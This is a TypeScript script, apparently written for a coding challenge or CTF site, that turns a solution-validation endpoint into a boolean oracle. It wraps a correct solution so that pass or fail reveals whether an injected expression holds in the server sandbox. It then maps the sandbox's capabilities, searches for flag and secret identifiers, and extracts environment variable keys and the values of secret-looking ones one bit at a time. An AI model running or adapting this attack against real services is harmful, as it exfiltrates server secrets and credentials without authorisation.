// Boolean-oracle explorer for the v3 L1 validate sandbox.
//
// v3 computes exploits server-side and leaks nothing to the client bundle.
// /api/level-1/validate runs our submitted solution inside the SERVER sandbox
// and returns {passed}. We wrap a KNOWN-correct solution so it returns the right
// answers only when a predicate about the sandbox holds, else throws (=> passed:false).
// Thus passed === predicate: a free boolean oracle (validate spends no attempt).
// We calibrate (true=>pass, false=>fail) before trusting anything, then map the
// sandbox capability surface and dump what secrets are reachable via code exec.
//
//   export CHEETCODE_GITHUB_PAT=ghp_...
//   CHEETCODE_GITHUB=<pat-owner-login> \
//   CHEETCODE_FINGERPRINT_HINTS_PATH=recon-output/safari-session-2026-08-28T0008/fingerprint-hints.json \
//   npx tsx src/level1-flag-oracle.ts
//
// ponytail: single-file diagnostic; delete after the flag question is settled.
import { promises as fs } from "node:fs";
import crypto from "node:crypto";
import { setTimeout as delay } from "node:timers/promises";
import { loadEnvFile } from "./env.js";
import { buildCookieHeader, buildFingerprintHints } from "./level1/api.js";
import { solveKnownProblem, extractFunctionName } from "./level1/solutions.js";
import type { LevelSession, CheetProblem } from "./level1/types.js";
import { TARGET_URL, STORAGE_STATE_PATH } from "./recon/capture.js";

loadEnvFile();

const github = (process.env.CHEETCODE_GITHUB || "").trim();
if (!github) throw new Error("Set CHEETCODE_GITHUB to the login that owns CHEETCODE_GITHUB_PAT.");

const storage = JSON.parse(await fs.readFile(STORAGE_STATE_PATH, "utf8"));
const cookie = buildCookieHeader(storage.cookies, new URL(TARGET_URL).hostname);

const hintsPath = process.env.CHEETCODE_FINGERPRINT_HINTS_PATH;
const fingerprintHints = hintsPath
  ? JSON.parse(await fs.readFile(hintsPath, "utf8"))
  : buildFingerprintHints(crypto.randomBytes(16).toString("hex"), Date.now());
const fingerprintId: string = fingerprintHints.fingerprintId;

const headers: Record<string, string> = {
  "content-type": "application/json",
  referer: TARGET_URL,
  cookie,
  "x-client-fingerprint": fingerprintId
};
if (process.env.CHEETCODE_GITHUB_PAT) headers["authorization"] = `Bearer ${process.env.CHEETCODE_GITHUB_PAT}`;

let calls = 0;
const MAX_CALLS = 6000;
async function post<T>(path: string, body: unknown, extra: Record<string, string> = {}): Promise<T> {
  for (let attempt = 0; ; attempt++) {
    const r = await fetch(new URL(path, TARGET_URL), { method: "POST", headers: { ...headers, ...extra }, body: JSON.stringify(body) });
    const text = await r.text();
    if (r.status === 429 && attempt < 6) { await delay(500 * (attempt + 1)); continue; }
    if (!r.ok) throw new Error(`${path} ${r.status}: ${text.slice(0, 400)}`);
    return JSON.parse(text) as T;
  }
}

const session = await post<LevelSession>("/api/session", { level: 1, isDev: false, fingerprintHints });
const problems = session.problems as CheetProblem[];
const solvedList = problems.map(solveKnownProblem);
const base = solvedList.find((s) => s.known);
if (!base) throw new Error("No known-solvable L1 problem in this session to wrap.");
const NAME = extractFunctionName(base.signature)!;
const solveRenamed = base.code.replace(new RegExp(`function\\s+${NAME}\\s*\\(`), "function __solve(");
console.log(`oracle problem: ${base.title} | ${base.signature}`);

function wrap(pred: string): string {
  return `function ${NAME}() {\n  var __P;\n  try { __P = !!(${pred}); } catch (e) { __P = false; }\n  if (!__P) throw new Error("m");\n  return __solve.apply(null, arguments);\n}\n${solveRenamed}`;
}

async function ask(pred: string): Promise<boolean> {
  if (++calls > MAX_CALLS) throw new Error(`Exceeded ${MAX_CALLS} validate calls; aborting.`);
  const res = await post<{ passed?: boolean }>("/api/level-1/validate", {
    sessionId: session.sessionId,
    problemId: base!.problemId,
    code: wrap(pred)
  });
  return res.passed === true;
}

// --- calibration: the oracle is worthless unless passed===predicate ---
const plain = await post<{ passed?: boolean }>("/api/level-1/validate", {
  sessionId: session.sessionId, problemId: base.problemId, code: base.code
});
const cTrue = await ask("true");
const cFalse = await ask("false");
console.log(`calibration: plain=${plain.passed === true} wrap(true)=${cTrue} wrap(false)=${cFalse}`);
if (plain.passed !== true || cTrue !== true || cFalse !== false) {
  console.log("CALIBRATION FAILED — oracle unreliable in this sandbox. Stopping.");
  process.exit(1);
}

// --- reusable string extractor over any server-side expression ---
async function extractString(expr: string, maxLen = 4096): Promise<{ len: number; str: string | null }> {
  const lenLt = (n: number) => ask(`Array.from(String(${expr})).length < ${n}`);
  let lo = 0, hi = maxLen;
  if (!(await lenLt(hi))) return { len: -1, str: null }; // over cap or not stringifiable
  while (lo < hi) { const m = (lo + hi) >> 1; if (await lenLt(m + 1)) hi = m; else lo = m + 1; }
  const len = lo;
  if (len <= 0) return { len, str: "" };
  const cps: number[] = [];
  for (let i = 0; i < len; i++) {
    let clo: number, chi: number;
    if (await ask(`Array.from(String(${expr}))[${i}].codePointAt(0) < 128`)) { clo = 0; chi = 128; }
    else { clo = 128; chi = 0x110000; }
    while (chi - clo > 1) { const m = Math.floor((clo + chi) / 2); if (await ask(`Array.from(String(${expr}))[${i}].codePointAt(0) < ${m}`)) chi = m; else clo = m; }
    cps.push(clo);
    process.stdout.write(`\r    extracting ${expr.slice(0, 28)} ${i + 1}/${len} calls=${calls}   `);
  }
  process.stdout.write("\n");
  return { len, str: String.fromCodePoint(...cps) };
}

// --- capability surface of the validate sandbox ---
console.log("sandbox capabilities:");
const caps: Record<string, string> = {
  process: "typeof process !== 'undefined'",
  "process.env": "typeof process !== 'undefined' && !!process.env",
  require: "typeof require !== 'undefined'",
  global: "typeof global !== 'undefined'",
  module: "typeof module !== 'undefined'",
  Buffer: "typeof Buffer !== 'undefined'",
  fetch: "typeof fetch !== 'undefined'",
  __dirname: "typeof __dirname !== 'undefined'",
  Function_ctor: "(function(){try{return typeof (new Function('return 1'))==='function';}catch(e){return false;}})()",
  fs_require: "(function(){try{require('fs');return true;}catch(e){return false;}})()"
};
const capState: Record<string, boolean> = {};
for (const [k, e] of Object.entries(caps)) { capState[k] = await ask(e); console.log(`  ${k} = ${capState[k]}`); }

// --- bare-identifier closure injections the grader might wrap our code in ---
const bareNames = ["__FIRECRAWL__", "FIRECRAWL", "__FLAG__", "FLAG", "__SECRET__", "SECRET", "__ANSWER__", "ANSWER", "__TOKEN__", "TOKEN", "__CTF__", "CTF", "__ctf_flag__", "firecrawlFlag", "flag"];
console.log("bare identifiers in scope (typeof !== 'undefined'):");
const bareHits: string[] = [];
for (const n of bareNames) { if (await ask(`typeof ${n} !== 'undefined'`)) { bareHits.push(n); console.log(`  HIT: ${n}`); } }
if (!bareHits.length) console.log("  (none)");

// --- full global surface dump ---
console.log("global own-property names:");
const gnames = await extractString("Object.getOwnPropertyNames(globalThis).join(',')", 8192);
console.log("  " + (gnames.str ?? `<len ${gnames.len}, over cap>`));
console.log("  has symbol-keyed globals = " + (await ask("Object.getOwnPropertySymbols(globalThis).length > 0")));

// --- if process.env exists, dump KEYS then values of secret-ish keys ---
if (capState["process.env"]) {
  console.log("process.env keys:");
  const keys = await extractString("Object.keys(process.env).join(',')", 16384);
  console.log("  " + (keys.str ?? `<len ${keys.len}, over cap>`));
  const interesting = (keys.str || "").split(",").filter(Boolean).filter((k) => /flag|fire|crawl|ctf|secret|token|hack|answer|key/i.test(k));
  for (const k of interesting) {
    const v = await extractString(`String(process.env[${JSON.stringify(k)}])`, 2048);
    console.log(`  env[${k}] = ${JSON.stringify(v.str)}`);
  }
}

// --- extract any bare identifier that was in scope ---
for (const n of bareHits) {
  const v = await extractString(`String(${n})`, 2048);
  console.log(`  bare ${n} = ${JSON.stringify(v.str)}`);
}

console.log("=".repeat(60));
console.log(`total validate calls: ${calls}`);
